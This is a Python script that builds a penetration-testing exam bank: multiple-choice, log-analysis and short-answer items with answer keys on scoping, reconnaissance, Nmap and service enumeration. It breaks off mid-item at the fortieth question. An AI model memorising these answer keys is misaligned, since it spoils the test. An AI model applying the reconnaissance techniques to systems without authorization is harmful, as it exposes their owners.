#!/usr/bin/env python3
"""
Writes all 124 curated items directly to content/pentest/exams/bank_temp.json.
"""
import sys
import json

data = {
    "version": 1,
    "objectiveAlignment": "UNVERIFIED",
    "status": "beta",
    "items": []
}

def add_mcq(item_id, module, lesson, claim, skill, difficulty, stem, options, ans_idx, opt_expls, expl):
    data["items"].append({
        "id": item_id,
        "type": "mcq",
        "skill": skill,
        "claim": claim,
        "module": module,
        "lesson": lesson,
        "difficulty": difficulty,
        "stem": stem,
        "options": options,
        "answer": [ans_idx],
        "optionExplanations": opt_expls,
        "explanation": expl,
    })

def add_multi(item_id, module, lesson, claim, skill, difficulty, stem, options, ans_indices, opt_expls, expl):
    data["items"].append({
        "id": item_id,
        "type": "multi",
        "skill": skill,
        "claim": claim,
        "module": module,
        "lesson": lesson,
        "difficulty": difficulty,
        "stem": stem,
        "options": options,
        "answer": ans_indices,
        "optionExplanations": opt_expls,
        "explanation": expl,
    })

def add_log(item_id, module, lesson, claim, skill, difficulty, log_text, stem, options, ans_idx, opt_expls, expl):
    data["items"].append({
        "id": item_id,
        "type": "log",
        "skill": skill,
        "claim": claim,
        "module": module,
        "lesson": lesson,
        "difficulty": difficulty,
        "log": log_text,
        "stem": stem,
        "options": options,
        "answer": [ans_idx],
        "optionExplanations": opt_expls,
        "explanation": expl,
    })

def add_short(item_id, module, lesson, claim, skill, difficulty, stem, acceptable, expl):
    data["items"].append({
        "id": item_id,
        "type": "short_answer",
        "skill": skill,
        "claim": claim,
        "module": module,
        "lesson": lesson,
        "difficulty": difficulty,
        "stem": stem,
        "options": [],
        "answer": [],
        "acceptableAnswers": acceptable,
        "explanation": expl,
    })

# --- M01: Assessment Methodologies & RoE (10 items) ---
add_mcq("kb-pentest-001", "M01", "pentest-r1-m01-methodology-roe-01", "P1", "pentest_methodology_scoping", 1,
    "During a penetration testing engagement, which document provides legal authorization and protection against computer crime statutory violations?",
    ["A verbal agreement from the client lead systems administrator", "A signed formal Rules of Engagement (RoE) and written Statement of Work from the system owner", "An informal email request from a department supervisor", "A third-party vulnerability disclosure program FAQ"],
    1, ["Verbal agreements offer zero legal defensibility in statutory prosecution.", "A signed formal RoE and Statement of Work from the legal asset owner provides explicit written authorization.", "Informal emails from non-owner personnel do not constitute legal authorization.", "A third-party FAQ does not grant scoped penetration testing rights on enterprise assets."],
    "Penetration testing strictly requires explicit written authorization signed by the verified system owner or corporate officer before any security probes begin, protecting against statutory violations such as the CFAA or CMA.")

add_mcq("kb-pentest-002", "M01", "pentest-r1-m01-methodology-roe-01", "P2", "pentest_methodology_scoping", 1,
    "Which core operational parameter is explicitly defined in a Rules of Engagement (RoE) document to avoid unexpected service degradation?",
    ["Permitted testing time windows and authorized maintenance periods", "The exact zero-day exploits the tester will write", "The client's annual cybersecurity budget", "The personal email passwords of the system administrators"],
    0, ["Testing windows and maintenance periods restrict intrusive scans to agreed off-peak hours.", "Testers do not commit to writing arbitrary zero-day exploits in an RoE.", "Financial operating budgets are outside the technical scope of an RoE.", "Personal administrator credentials are never scoped or authorized for collection."],
    "The Rules of Engagement (RoE) defines explicit testing windows, allowed source IP addresses, targeted IP ranges, and communication channels to minimize operational risk.")

add_mcq("kb-pentest-003", "M01", "pentest-r1-m01-methodology-roe-01", "P3", "pentest_methodology_scoping", 2,
    "According to the Penetration Testing Execution Standard (PTES), which phase immediately follows Intelligence Gathering and precedes Vulnerability Analysis?",
    ["Threat Modeling", "Exploitation", "Post-Exploitation", "Reporting"],
    0, ["Threat Modeling evaluates gathered intelligence to identify primary targets and attack paths before active scanning.", "Exploitation occurs only after Vulnerability Analysis has confirmed target weaknesses.", "Post-Exploitation occurs after successful code execution on compromised systems.", "Reporting is the final deliverable phase of the PTES lifecycle."],
    "PTES sequence is: 1. Pre-engagement, 2. Intelligence Gathering, 3. Threat Modeling, 4. Vulnerability Analysis, 5. Exploitation, 6. Post-Exploitation, 7. Reporting.")

add_mcq("kb-pentest-004", "M01", "pentest-r1-m01-roe-communications-halt-01", "P4", "pentest_methodology_scoping", 1,
    "If a mission-critical web server becomes unresponsive during an authorized penetration test, what is the mandatory immediate action required of the operator?",
    ["Immediately halt all testing activities and contact the client emergency technical point of contact", "Launch a distributed denial of service attack to verify if the server rebooted", "Ignore the crash and proceed scanning the remaining internal subnets", "Attempt to overwrite system kernel binaries to force a remote restart"],
    0, ["The emergency halt procedure requires immediately stopping probes and notifying designated client contacts.", "Launching further aggressive traffic risks causing catastrophic permanent system failure.", "Ignoring unannounced downtime breaches the RoE and duty of care.", "Overwriting binaries is destructive and strictly prohibited under ethical standards."],
    "Under NIST SP 800-115 and standard RoE protocols, any unforeseen operational disruption requires immediately suspending testing and notifying designated emergency contacts.")

add_mcq("kb-pentest-005", "M01", "pentest-r1-m01-legal-ethics-authorization-01", "P5", "pentest_legal_authorization", 2,
    "When conducting a penetration test against target virtual machines hosted in a public cloud (e.g. AWS or GCP), what is the tester required to do?",
    ["Comply strictly with the cloud provider's published penetration testing policies and prohibited techniques", "Scan the underlying hypervisor hardware to test multi-tenant isolation", "Request root API keys to the cloud vendor's hypervisor management plane", "Perform volumetric DDoS attacks against cloud edge load balancers"],
    0, ["Cloud providers publish explicit policies outlining permissible target user instances and banned shared infrastructure attacks.", "Targeting multi-tenant physical hypervisors violates cloud terms of service and federal wiretap statutes.", "Cloud providers never disclose hypervisor management access to third-party assessors.", "Volumetric DDoS against shared cloud infrastructure is universally prohibited."],
    "Cloud vendors allow testing of customer-owned compute instances but strictly prohibit attacking shared hypervisors, cloud control planes, or executing volumetric DDoS.")

add_mcq("kb-pentest-006", "M01", "pentest-r1-m01-legal-ethics-authorization-01", "P6", "pentest_legal_authorization", 1,
    "What essential information must be documented in a physical or digital 'Get out of Jail' authorization letter carried by a penetration tester?",
    ["Authorized tester names, authorized IP/target scopes, test date range, and executive sponsor signatures with phone numbers", "A complete listing of all zero-day exploit source codes used by the operator", "The tester's personal home address and bank account details", "An exemption from criminal prosecution under all future international laws"],
    0, ["The authorization letter proves written consent, defining who, what, when, and who approved the engagement.", "Exploit source codes are deliverables for technical annexes, not legal credential letters.", "Personal banking information has no relevance to operational security authorization.", "No corporate document can grant unilateral immunity from statutory criminal law without valid owner authorization."],
    "An authorization letter contains dates, scope boundaries, tester identities, and emergency client contact numbers to present to law enforcement or security personnel if questioned.")

add_mcq("kb-pentest-007", "M01", "pentest-r1-m01-legal-ethics-authorization-01", "P7", "pentest_legal_authorization", 1,
    "Which of the following activities is universally excluded from standard commercial penetration testing scopes unless explicitly commissioned in writing?",
    ["Volumetric Denial of Service (DoS/DDoS) and permanent data destruction", "Port scanning open TCP services with Nmap", "Passive DNS reconnaissance using public WHOIS records", "Enumerating web application login forms"],
    0, ["DoS and destructive data deletion disrupt business operations and are excluded from standard testing.", "TCP port scanning is a core, standard reconnaissance activity in every network assessment.", "Passive WHOIS queries generate zero traffic to client systems and are standard practice.", "Enumerating web forms is standard web application testing methodology."],
    "Standard penetration testing focuses on identifying and proving exploitable risks without causing operational downtime or permanent data corruption.")

add_multi("kb-pentest-008", "M01", "pentest-r1-m01-methodology-roe-01", "P2", "pentest_methodology_scoping", 2,
    "Which of the following components are mandatory inclusions in a comprehensive Rules of Engagement (RoE) document? (Select all that apply)",
    ["Specific target IP addresses, CIDR blocks, and domains in scope", "Explicitly prohibited systems, out-of-scope third-party assets, and banned attack techniques", "Designated points of contact with 24/7 emergency escalation phone numbers", "A guarantee that zero vulnerabilities exist in the client network"],
    [0, 1, 2], ["Explicit CIDR and domain lists define the authorized legal testing boundary.", "Exclusions prevent accidental testing of third-party vendors or sensitive operational equipment.", "Emergency escalation paths allow instant communication if operational impact occurs.", "Security testing can never guarantee zero vulnerabilities; proving absence is impossible."],
    "A complete RoE establishes in-scope assets, out-of-scope boundaries, authorized testing windows, permitted techniques, and emergency communication protocols.")

add_short("kb-pentest-009", "M01", "pentest-r1-m01-legal-ethics-authorization-01", "P1", "pentest_legal_authorization", 2,
    "What is the acronym of the primary United States federal statutory legislation (18 U.S.C. § 1030) that criminalizes unauthorized access to protected computers?",
    ["CFAA", "Computer Fraud and Abuse Act"],
    "The Computer Fraud and Abuse Act (CFAA), codified at 18 U.S.C. § 1030, is the primary US federal statute penalizing intentional unauthorized access to protected computers.")

add_log("kb-pentest-010", "M01", "pentest-r1-m01-threat-modeling-risk-01", "P2", "pentest_methodology_scoping", 2,
    "[SCOPE-VERIFY] Target validation initiated.\nInput CIDR: 192.0.2.0/24 (Client: Apex Health Systems)\nTarget Host: 192.0.2.145 -> MATCH [IN-SCOPE]\nTarget Host: 198.51.100.22 -> REJECTED: Third-party Cloudflare CDN [OUT-OF-SCOPE]\nTarget Host: 192.0.2.254 -> Gateway Router -> FLAGGED [NO-INTRUSIVE-EXPLOIT]",
    "Review the automated scope validation log snippet above. Why was 198.51.100.22 rejected from the active test plan?",
    ["It belongs to a third-party cloud provider and falls outside the client's authorized ownership scope", "The host is completely offline and does not respond to ICMP ping sweeps", "The IP address is an invalid IPv4 address format", "The host is running an unsupported operating system"],
    0, ["Testing third-party multi-tenant infrastructure without explicit vendor authorization is illegal.", "The log clearly states 'REJECTED: Third-party Cloudflare CDN', not host unreachability.", "198.51.100.22 is a valid RFC 5737 IPv4 address.", "The log makes no reference to operating system incompatibility."],
    "Testers must strictly distinguish between client-owned assets and shared third-party CDN or SaaS infrastructure to avoid unauthorized probing of third-party networks.")

# --- M02: Passive Recon & OSINT (8 items) ---
add_mcq("kb-pentest-011", "M02", "pentest-r1-m02-dns-whois-recon-01", "P8", "pentest_passive_recon", 1,
    "What fundamental operational characteristic distinguishes passive reconnaissance from active reconnaissance?",
    ["Passive reconnaissance generates zero direct network packet traffic to the target organization's servers", "Passive reconnaissance uses automated exploitation frameworks like Metasploit", "Passive reconnaissance requires logging into target servers with administrative credentials", "Passive reconnaissance is strictly prohibited during authorized penetration tests"],
    0, ["Passive recon queries publicly available third-party repositories, search engines, and registries without contacting target hosts.", "Automated exploitation frameworks generate heavy, direct network traffic.", "Logging in with credentials is an active post-exploitation or authentication testing activity.", "Passive reconnaissance is completely legal and a standard initial phase in every professional engagement."],
    "Passive information gathering queries external third-party repositories (WHOIS, public DNS, search engines, Certificate Transparency logs) without sending probes to the client's infrastructure.")

add_short("kb-pentest-012", "M02", "pentest-r1-m02-dns-whois-recon-01", "P9", "pentest_passive_recon", 1,
    "Which standard TCP destination port is queried when sending requests to regional WHOIS directory services (RFC 3912)?",
    ["43", "tcp/43", "port 43"],
    "The WHOIS protocol standard defines TCP port 43 as the default service port for domain and IP allocation queries.")

add_multi("kb-pentest-013", "M02", "pentest-r1-m02-dns-whois-recon-01", "P10", "pentest_passive_recon", 2,
    "Which of the following DNS record types can expose target mail infrastructure and authoritative nameservers during reconnaissance? (Select all that apply)",
    ["MX (Mail Exchange)", "NS (Name Server)", "TXT (Text records, e.g. SPF/DKIM)", "SYN (Synchronization)"],
    [0, 1, 2], ["MX records specify mail servers responsible for receiving domain emails.", "NS records identify authoritative DNS nameservers for the domain zone.", "TXT records often disclose third-party SaaS integrations, verification codes, and mail delivery SPF ranges.", "SYN is a TCP flag in the transport layer, not a DNS resource record type."],
    "MX records reveal email gateways, NS records identify authoritative servers, and TXT records expose SPF records with permitted sending IP blocks.")

add_mcq("kb-pentest-014", "M02", "pentest-r1-m02-search-dorking-subdomains-01", "P11", "pentest_osint_dorking", 2,
    "How do Certificate Transparency (CT) logs enable ethical hackers to discover hidden target subdomains during passive intelligence gathering?",
    ["They provide a publicly searchable, append-only record of all SSL/TLS certificates issued by public Certificate Authorities", "They crack the private RSA keys of target web servers", "They intercept and decrypt active user HTTPS sessions in transit", "They send automated SQL injection probes to web server certificates"],
    0, ["Public CT logs allow searching historical and newly issued certificates, exposing internal or development hostnames.", "CT logs record public certificate metadata; they do not contain or crack private keys.", "CT logs are passive audit databases and cannot intercept or decrypt live network transit.", "CT logs contain cryptographic certificate records, not web applications."],
    "Certificate Transparency logs (e.g. crt.sh) store all issued TLS certificates, allowing testers to discover obscure subdomains without transmitting packets to target hosts.")

add_mcq("kb-pentest-015", "M02", "pentest-r1-m02-search-dorking-subdomains-01", "P12", "pentest_osint_dorking", 2,
    "Which advanced Google search operator (Google Dork) restricts results to specific document file types such as configuration files or database dumps?",
    ["filetype:", "site:", "inurl:", "intitle:"],
    0, ["The 'filetype:' operator (or 'ext:') filters results to documents ending with specified extensions like sql, pdf, or env.", "The 'site:' operator restricts search results to a specific domain or host.", "The 'inurl:' operator matches text appearing within the URL path or parameter string.", "The 'intitle:' operator searches for text located inside HTML title tags."],
    "Google Dorks use 'filetype:sql' or 'filetype:env' to locate inadvertently indexed database backups or environment files.")

add_log("kb-pentest-016", "M02", "pentest-r1-m02-dns-whois-recon-01", "P9", "pentest_passive_recon", 2,
    "Registrant Organization: Apex Health Systems LLC\nRegistrant State/Province: CA\nRegistrant Country: US\nName Server: NS1.APEX-HEALTH.EXAMPLE\nName Server: NS2.APEX-HEALTH.EXAMPLE\nNetRange: 192.0.2.0 - 192.0.2.255\nCIDR: 192.0.2.0/24\nOriginAS: AS64496",
    "Based on the WHOIS directory output above, what is the authoritative autonomous system number (ASN) originating the client's public network block?",
    ["AS64496", "192.0.2.0/24", "NS1.APEX-HEALTH.EXAMPLE", "Apex Health Systems LLC"],
    0, ["The OriginAS field explicitly identifies AS64496 as the BGP routing autonomous system.", "192.0.2.0/24 is the network CIDR block, not the autonomous system identifier.", "NS1.APEX-HEALTH.EXAMPLE is the authoritative nameserver hostname.", "Apex Health Systems LLC is the registrant organization name."],
    "The OriginAS record identifies AS64496, which can be further queried using BGP route viewers to uncover all IP prefixes owned by the enterprise.")

add_log("kb-pentest-017", "M02", "pentest-r1-m02-search-dorking-subdomains-01", "P10", "pentest_passive_recon", 2,
    ";; ANSWER SECTION:\napex.example.        3600    IN      TXT     \"v=spf1 ip4:192.0.2.0/24 include:_spf.google.com ~all\"\napex.example.        3600    IN      TXT     \"apex-domain-verification=7f93a1c82b0e45\"\napex.example.        3600    IN      MX      10 mail.apex.example.",
    "Analyzing the DNS TXT query output above, what third-party cloud service provider is authorized to dispatch emails on behalf of apex.example?",
    ["Google Workspace (_spf.google.com)", "Microsoft Office 365", "Amazon Simple Email Service (SES)", "SendGrid Email Delivery"],
    0, ["The SPF record contains 'include:_spf.google.com', authorizing Google's mail relay servers.", "Office 365 SPF includes 'spf.protection.outlook.com', which is absent here.", "Amazon SES utilizes 'amazonses.com' SPF includes.", "SendGrid uses 'sendgrid.net' SPF directives."],
    "SPF records in DNS TXT entries frequently identify third-party SaaS vendors and organizational email architectures used by target companies.")

add_mcq("kb-pentest-018", "M02", "pentest-r1-m02-asn-bgp-infrastructure-01", "P122", "pentest_asn_infrastructure", 1,
    "On a Linux testing machine, which system configuration file allows an operator to statically map target hostnames to IP addresses prior to public DNS resolution?",
    ["/etc/hosts", "/etc/resolv.conf", "/etc/nsswitch.conf", "/etc/network/interfaces"],
    0, ["The /etc/hosts file provides local static name-to-IP bindings that take precedence over external DNS lookups.", "/etc/resolv.conf designates nameserver IP addresses for external DNS queries.", "/etc/nsswitch.conf defines lookup order between files and DNS services.", "/etc/network/interfaces configures static or dynamic IP addressing on local network adapters."],
    "Testers edit '/etc/hosts' to map discovered virtual hosts and internal domain names to target IP addresses before testing virtual host routing.")

# --- M03: Active Host & Network Port Scanning (10 items) ---
add_short("kb-pentest-019", "M03", "pentest-r1-m03-nmap-host-discovery-01", "P13", "pentest_host_discovery", 1,
    "Which Nmap command-line option disables port scanning entirely to perform host discovery (ping sweep) only?",
    ["-sn"],
    "The '-sn' option (previously known as '-sP') instructs Nmap to skip port scanning and only determine whether target hosts are online.")

add_mcq("kb-pentest-020", "M03", "pentest-r1-m03-nmap-host-discovery-01", "P14", "pentest_host_discovery", 2,
    "When Nmap is executed by a privileged user (root) against targets located on the local Ethernet subnet, what host discovery technique does it default to?",
    ["ARP requests (-PR)", "ICMP Echo Requests (-PE)", "TCP SYN probes to port 80", "UDP probes to port 161"],
    0, ["ARP queries on local Ethernet resolve hardware MAC addresses reliably regardless of host packet firewalls.", "ICMP echo is used for remote routed networks, not local subnets.", "TCP SYN probes are used when routing across gateways.", "UDP probes are not used as the default local discovery mechanism."],
    "On local Ethernet segments, Nmap uses ARP discovery because hosts must answer ARP requests to communicate on the data link layer, even if personal firewalls block ICMP.")

add_mcq("kb-pentest-021", "M03", "pentest-r1-m03-nmap-host-discovery-01", "P15", "pentest_host_discovery", 1,
    "Why is the '-Pn' flag frequently required when scanning hardened enterprise target networks?",
    ["It forces Nmap to skip host discovery and treat all specified IP addresses as online, bypassing ICMP drop rules", "It automatically cracks passwords on filtered ports", "It proxies all Nmap scan probes through the Tor network", "It switches Nmap from TCP scanning to wireless radio scanning"],
    0, ["When firewalls drop ICMP ping requests, Nmap would otherwise mark live hosts as down without '-Pn'.", "Nmap port scanners do not perform automated password cracking.", "Tor proxying requires proxychains or --proxies, not -Pn.", "-Pn has nothing to do with wireless radio frequencies."],
    "The '-Pn' flag skips initial ICMP/ping probes, ensuring that target hosts with firewalls configured to drop ICMP are still subjected to port scanning.")

add_mcq("kb-pentest-022", "M03", "pentest-r1-m03-tcp-udp-port-scanning-01", "P16", "pentest_port_scanning", 2,
    "What packet sequence occurs between Nmap and an open target port during a TCP SYN (half-open) scan?",
    ["Nmap sends SYN; target responds with SYN/ACK; Nmap immediately responds with RST", "Nmap sends SYN; target responds with ACK; Nmap sends PSH/ACK", "Nmap sends FIN; target responds with RST/ACK; Nmap sends SYN", "Nmap sends full 3-way handshake followed by HTTP GET"],
    0, ["Sending RST after receiving SYN/ACK tears down the half-open connection before an application session is established.", "A standard TCP handshake response to SYN is SYN/ACK, not raw ACK alone.", "FIN probes are used in specialized stealth scans, not standard SYN scans.", "Completing the handshake is characteristic of TCP Connect (-sT), not half-open SYN scans."],
    "In a TCP SYN scan (-sS), Nmap sends a SYN; receiving a SYN/ACK confirms the port is open, and Nmap immediately resets (RST) the socket before completing the handshake.")

add_mcq("kb-pentest-023", "M03", "pentest-r1-m03-tcp-udp-port-scanning-01", "P17", "pentest_port_scanning", 2,
    "Under what operational constraint must an operator use a TCP Connect scan (-sT) instead of a TCP SYN scan (-sS)?",
    ["When running as an unprivileged user without raw network socket privileges", "When scanning through a hardware firewall", "When scanning systems running FreeBSD", "When scanning more than 100 ports simultaneously"],
    0, ["TCP Connect uses the standard OS connect() syscall, which unprivileged non-root users are permitted to invoke.", "Hardware firewalls inspect both SYN and Connect packets identically at layer 4.", "Target operating systems respond to SYN probes regardless of being FreeBSD or Linux.", "Port counts have no bearing on socket creation privileges."],
    "TCP Connect scan (-sT) relies on the high-level system connect() call, which operates without raw packet creation privileges required for SYN scans.")

add_mcq("kb-pentest-024", "M03", "pentest-r1-m03-tcp-udp-port-scanning-01", "P18", "pentest_port_scanning", 2,
    "During an Nmap TCP SYN port scan, what response from a target indicates that a port is closed?",
    ["A TCP RST packet", "A TCP SYN/ACK packet", "No response received within timeout", "An ICMP Echo Reply"],
    0, ["A closed port actively rejects incoming connections by returning a TCP RST (reset) packet.", "SYN/ACK indicates that an application is actively listening (open port).", "No response indicates packet filtering by a firewall (filtered state).", "ICMP Echo Reply is a response to ping, not TCP transport probes."],
    "RFC 793 dictates that if a connection attempt arrives at a port with no listening service, the host must return a TCP RST packet.")

add_mcq("kb-pentest-025", "M03", "pentest-r1-m03-tcp-udp-port-scanning-01", "P19", "pentest_port_scanning", 2,
    "How does an Nmap UDP scan (-sU) determine that a target UDP port is closed?",
    ["The target returns an ICMP Port Unreachable message (Type 3, Code 3)", "The target returns a UDP ACK packet", "The target returns a TCP RST packet", "The target immediately closes the network connection"],
    0, ["When a UDP packet arrives at a closed port, the operating system IP stack returns ICMP Destination Unreachable (Type 3, Code 3).", "UDP is connectionless and has no concept of an ACK flag.", "TCP packets are not generated by closed UDP sockets.", "Connection closing applies to stateful connection-oriented protocols."],
    "In UDP scanning, receiving an ICMP Port Unreachable (Type 3, Code 3) error confirms the target port is closed.")

add_short("kb-pentest-026", "M03", "pentest-r1-m03-tcp-udp-port-scanning-01", "P105", "pentest_port_scanning", 1,
    "Which Nmap port specification flag instructs the tool to scan the full range of all 65,535 TCP ports?",
    ["-p-"],
    "The '-p-' flag specifies the entire port range from 1 through 65535, overriding Nmap's default of scanning only the top 1,000 ports.")

add_log("kb-pentest-027", "M03", "pentest-r1-m03-nmap-host-discovery-01", "P103", "pentest_port_scanning", 2,
    "PORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))\nOS details: Linux 5.4 - 5.15",
    "Reviewing the Nmap scan output above, what operating system family and web server version are running on the target?",
    ["Ubuntu Linux running Apache httpd 2.4.41", "CentOS Linux running Nginx 1.18", "Windows Server 2019 running IIS 10", "FreeBSD running Lighttpd"],
    0, ["The version banners and OS fingerprint explicitly indicate Ubuntu Linux and Apache httpd 2.4.41.", "Nginx and CentOS are completely contradictory to the OpenSSH Ubuntu banner.", "IIS and Windows Server are incompatible with the Linux kernel and Apache banners.", "FreeBSD is excluded by the Linux kernel version detection."],
    "Service banner grabbing (-sV) and OS detection (-O) correlate OpenSSH on Ubuntu with Apache 2.4.41, confirming an Ubuntu Linux target.")

add_multi("kb-pentest-028", "M03", "pentest-r1-m03-nmap-scripting-engine-01", "P104", "pentest_port_scanning", 2,
    "Which scanning capabilities are activated when executing Nmap with the aggressive '-A' option? (Select all that apply)",
    ["Service version detection (-sV)", "Default script scanning (-sC)", "Operating system detection (-O)", "Automatic password cracking of root accounts"],
    [0, 1, 2], ["-sV is bundled into the -A option.", "-sC default scripts are executed under -A.", "-O OS fingerprinting is enabled under -A.", "Nmap does not crack passwords under -A; that requires brute-force scripts or specialized tools."],
    "Nmap '-A' enables aggressive scanning, which combines service version detection (-sV), default NSE scripts (-sC), OS detection (-O), and traceroute.")

# --- M04: Network Service Enumeration (9 items) ---
add_short("kb-pentest-029", "M04", "pentest-r1-m04-smb-enum-shares-01", "P20", "pentest_smb_enumeration", 1,
    "Which TCP port is used for modern direct SMB communication without NetBIOS encapsulation?",
    ["445", "tcp/445", "port 445"],
    "TCP port 445 hosts direct-hosted SMB (Server Message Block) traffic in modern Windows and Samba environments.")

add_mcq("kb-pentest-030", "M04", "pentest-r1-m04-smb-enum-shares-01", "P21", "pentest_smb_enumeration", 2,
    "What credentials are transmitted when an ethical hacker initiates an SMB Null Session attack against a target file server?",
    ["An empty username and an empty password ('')", "Username 'administrator' with password 'password'", "Username 'guest' with password 'guest'", "The local system machine account hash"],
    0, ["A null session explicitly authenticates with an empty username and an empty password to query unauthenticated IPC$ pipes.", "'administrator' is a named privileged account, not a null session.", "'guest' represents the guest account session, distinct from a null session.", "Machine account hashes are used in Silver Ticket attacks, not SMB null sessions."],
    "SMB null sessions establish unauthenticated IPC$ connections using empty credentials (''/NULL), historically allowing enumeration of domain users and shares.")

add_log("kb-pentest-031", "M04", "pentest-r1-m04-smb-enum-shares-01", "P22", "pentest_smb_enumeration", 2,
    "Sharename       Type      Comment\n---------       ----      -------\nADMIN$          Disk      Remote Admin\nC$              Disk      Default share\nIPC$            IPC       Remote IPC\nbackups         Disk      Internal contractor staging",
    "Reviewing the SMB share enumeration output above, which non-default share warrants immediate inspection for leaked credentials?",
    ["backups", "ADMIN$", "C$", "IPC$"],
    0, ["'backups' is a custom operational share likely containing unprotected files, scripts, or credentials.", "ADMIN$ is a default restricted administrative share requiring admin privileges.", "C$ is the default administrative drive root share.", "IPC$ is the inter-process communication pipe used for RPC calls."],
    "Custom non-administrative shares like 'backups' or 'public' frequently suffer from misconfigured read permissions, exposing sensitive corporate data.")

add_short("kb-pentest-032", "M04", "pentest-r1-m04-ftp-ssh-enum-01", "P23", "pentest_ftp_ssh_enumeration", 1,
    "What standard username is universally used to test for anonymous access on FTP servers?",
    ["anonymous"],
    "RFC 959 defines 'anonymous' as the standardized username for public FTP access, traditionally accepted with any email as password.")

add_mcq("kb-pentest-033", "M04", "pentest-r1-m04-ftp-ssh-enum-01", "P24", "pentest_ftp_ssh_enumeration", 2,
    "How does FTP Passive mode (PASV) differ from FTP Active mode (PORT) regarding firewall compatibility?",
    ["In Passive mode, the client initiates the data connection to a high port opened by the server, avoiding inbound firewall blocks on the client", "In Passive mode, all traffic is sent in cleartext over UDP port 69", "In Active mode, the server opens an unprivileged port and waits for the client", "In Passive mode, the data connection is encrypted using TLS 1.3 automatically"],
    0, ["Passive mode requires the client to connect outbound, which client-side stateful firewalls permit.", "UDP port 69 is TFTP, not Passive FTP.", "In Active mode, the server connects back to the client from port 20.", "Passive mode refers to connection direction, not TLS encryption."],
    "FTP Passive mode (PASV) requires the client to initiate both the control and data connections outbound, preventing client firewall issues.")

add_log("kb-pentest-034", "M04", "pentest-r1-m04-ftp-ssh-enum-01", "P25", "pentest_ftp_ssh_enumeration", 2,
    "$ nc -vn 192.0.2.100 22\nConnection to 192.0.2.100 22 port [tcp/ssh] succeeded!\nSSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1",
    "What vital reconnaissance data is directly disclosed by the raw banner returned above?",
    ["OpenSSH version 8.9p1 running on Ubuntu Linux", "The target host's root password hash", "The internal routing table of the gateway", "A list of valid Active Directory domain users"],
    0, ["The banner explicitly identifies protocol SSH-2.0, OpenSSH 8.9p1, and Ubuntu distribution package 3ubuntu0.1.", "SSH connection banners do not disclose password hashes.", "Routing tables require shell access or SNMP queries, not SSH banners.", "Domain users are not enumerated by basic transport banners."],
    "Banner grabbing reveals software names and versions, allowing operators to cross-reference known CVE advisories for specific package builds.")

add_mcq("kb-pentest-035", "M04", "pentest-r1-m04-snmp-db-enum-01", "P26", "pentest_snmp_db_enumeration", 2,
    "Which transport port and protocol are utilized by SNMP agents to answer monitoring requests, and what are the common default community strings?",
    ["UDP port 161 using plaintext strings 'public' and 'private'", "TCP port 161 using Kerberos tickets", "UDP port 389 using LDAP bindings", "TCP port 25 using SMTP commands"],
    0, ["SNMP operates over UDP port 161, with community strings acting as plaintext passwords in SNMPv1 and SNMPv2c.", "SNMP does not use TCP port 161 or Kerberos in standard configurations.", "UDP port 389 is LDAP/CLDAP, not SNMP.", "TCP port 25 is SMTP mail transfer."],
    "SNMPv1 and SNMPv2c use UDP port 161 with unencrypted community strings ('public' for read-only, 'private' for read-write).")

add_multi("kb-pentest-036", "M04", "pentest-r1-m04-snmp-db-enum-01", "P28", "pentest_snmp_db_enumeration", 1,
    "Which of the following default listening ports correctly correspond to standard database services? (Select all that apply)",
    ["MySQL / MariaDB on TCP port 3306", "Microsoft SQL Server (MSSQL) on TCP port 1433", "PostgreSQL on TCP port 5432", "Oracle Database Listener on TCP port 80"],
    [0, 1, 2], ["MySQL and MariaDB listen on TCP port 3306 by default.", "Microsoft SQL Server uses TCP port 1433 for relational engine queries.", "PostgreSQL listens on TCP port 5432 by default.", "Oracle Listener uses TCP port 1521, while port 80 is HTTP."],
    "Standard default database ports: MySQL/MariaDB (3306), MSSQL (1433), PostgreSQL (5432), and Oracle (1521).")

add_log("kb-pentest-037", "M04", "pentest-r1-m04-web-server-fingerprinting-01", "P106", "pentest_web_server_fingerprinting", 2,
    "$ gobuster dir -u http://192.0.2.50 -w /usr/share/wordlists/dirb/common.txt -x php,txt\n/admin.php            (Status: 200) [Size: 1420]\n/config.php.bak       (Status: 200) [Size: 840]\n/uploads              (Status: 301) [Size: 0] [--> /uploads/]",
    "Analyzing the directory fuzzing output above, which discovered file presents the highest immediate likelihood of credential disclosure?",
    ["/config.php.bak", "/admin.php", "/uploads", "/common.txt"],
    0, ["Backup files (.bak) often contain hardcoded database passwords and bypass server-side PHP execution, displaying raw source code.", "/admin.php renders an administrative login portal, requiring credentials.", "/uploads is a storage directory, requiring further enumeration.", "/common.txt is the local dictionary filename, not a remote endpoint."],
    "Backup files like 'config.php.bak' are not executed by web servers as PHP code and are served as plaintext, frequently disclosing hardcoded credentials.")

# --- M05: Vulnerability Assessment & CVSS (8 items) ---
add_mcq("kb-pentest-038", "M05", "pentest-r1-m05-vuln-scanning-cve-search-01", "P29", "pentest_vuln_assessment", 1,
    "What is the official standardized naming format used by the MITRE CVE Program to catalog public cybersecurity vulnerabilities?",
    ["CVE-YYYY-NNNNN", "VULN-NNNN-YYYY", "EXPLOIT-YYYY-NNNN", "SEC-CVE-NNNN"],
    0, ["CVE identifiers follow the syntax CVE-YEAR-NUMBER (e.g. CVE-2021-44228).", "VULN is not the official prefix.", "EXPLOIT is an Exploit-DB convention, not the CVE standard.", "SEC-CVE is non-standard."],
    "CVE (Common Vulnerabilities and Exposures) identifiers strictly follow the format 'CVE-YYYY-NNNNN'.")

add_mcq("kb-pentest-039", "M05", "pentest-r1-m05-vuln-scanning-cve-search-01", "P30", "pentest_findings_documentation", 1,
    "In CVSS v3.1 scoring, what qualitative severity rating is assigned to a vulnerability with a base score between 7.0 and 8.9?",
    ["High", "Critical", "Medium", "Low"],
    0, ["Base scores from 7.0 to 8.9 are categorized as High severity.", "Scores from 9.0 to 10.0 are Critical.", "Scores from 4.0 to 6.9 are Medium.", "Scores from 0.1 to 3.9 are Low."],
    "CVSS v3.1 qualitative severity bands: None (0.0), Low (0.1–3.9), Medium (4.0–6.9), High (7.0–8.9), and Critical (9.0–10.0).")

add_log("kb-pentest-040", "M05", "pentest-r1-m05-vuln-scanning-cve-search-01", "P31", "pentest_vuln_assessment", 2,
